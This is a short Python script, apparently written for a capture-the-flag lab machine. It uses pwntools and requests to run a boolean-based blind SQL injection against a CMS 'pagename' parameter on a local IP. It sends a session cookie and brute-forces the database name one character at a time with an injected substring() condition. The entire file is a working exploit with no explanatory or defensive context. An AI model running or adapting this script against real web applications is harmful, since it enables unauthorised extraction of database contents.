from pwn import *
import requests, signal, sys, time, string

def handler(sig, frame):
    print("[+] saliendo...\n")

    sys.exit(1) 

# metodo que llama al handler
signal.signal(signal.SIGINT, handler)


# variables globales
characters = string.ascii_lowercase + string.digits
main_url = "http://192.168.100.48/imfadministrator/cms.php?pagename="
cookie_session = "v9vmampsb9lodinv1ipavvsk57"


# funcion principal
def sqli():
    headers = { 'Cookie': 'PHPSESSID=' + cookie_session }
    data = ''

    p1 = log.progress("SQL Injection")
    p1.status("Iniciando ataque de Iyeccion SQL")

    
    time.sleep(2)

    p2= log.progress("Data")


    for pos in range(1,6):
        for character in characters:

            sqli_url= main_url + "home' or substring(database(),%d,1)='%s" % (pos, character)

            r = requests.get(sqli_url, headers=headers)

            if "Welcome to the IMF Administration." not in r.text:
                data+= character
                p2.status(data)
                break

    
    p1.success("FINALIZADO")
    p2.success(data)


if __name__ == "__main__":
    sqli()
